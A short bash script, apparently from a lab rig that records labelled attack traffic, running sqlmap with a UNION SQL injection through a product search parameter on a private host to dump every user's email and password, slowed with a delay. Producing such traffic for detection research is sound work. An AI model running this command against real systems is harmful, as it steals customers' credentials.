#!/usr/bin/env bash
# ATK-08 variant b: low and slow. The same sqlmap UNION dump of Users through search as ATK-08.a, but
# with --delay so the whole dump of every customer takes 2-3 minutes. sqlmap's own user agent.
# Runs inside the rig's tools container only (recording/record.sh).
# tool: sqlmap 1.10.11
# label: low and slow: sqlmap UNION dump of Users through search with --delay, sqlmap user agent
set -eu
sqlmap -u 'http://10.66.0.10/rest/products/search?q=apple' -p q \
  --dbms=sqlite --technique=U --prefix="'))" --suffix='--' --no-cast --batch --answers='crack=N' \
  --delay=0.36 -T Users -C email,password --dump \
  -t /out/traffic.txt --output-dir=/out/sqlmap
